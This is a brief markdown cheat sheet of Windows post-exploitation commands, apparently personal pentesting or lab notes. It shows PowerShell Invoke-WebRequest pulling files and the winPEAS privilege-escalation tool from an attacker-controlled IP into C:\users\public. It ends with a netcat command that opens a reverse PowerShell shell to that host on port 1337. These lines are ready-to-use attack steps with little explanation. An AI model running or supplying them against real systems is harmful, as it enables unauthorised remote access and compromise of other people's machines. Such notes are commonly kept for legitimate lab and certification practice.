# windows stuff

### enumerate windows-binaries on kali

```
apt install windows-binaries
dpkg -L windows-binaries
```


### download files using powershell

```powershell
Invoke-WebRequest -Uri "http://192.168.19.66:8000/downloadme" -OutFile "C:\Program Files (x86)\downloadme"
```

For example donwloading winpeas: The path `C:\users\public` is most of the times writable.

```powershell
Invoke-WebRequest -Uri "http://192.168.19.66:8000/winPEASx64.exe" -OutFile "C:\users\public\winPEASx64.exe"
```

### start powershell using netcat`

```
C:\users\public\nc.exe -e powershell.exe 192.168.19.66 1337
```
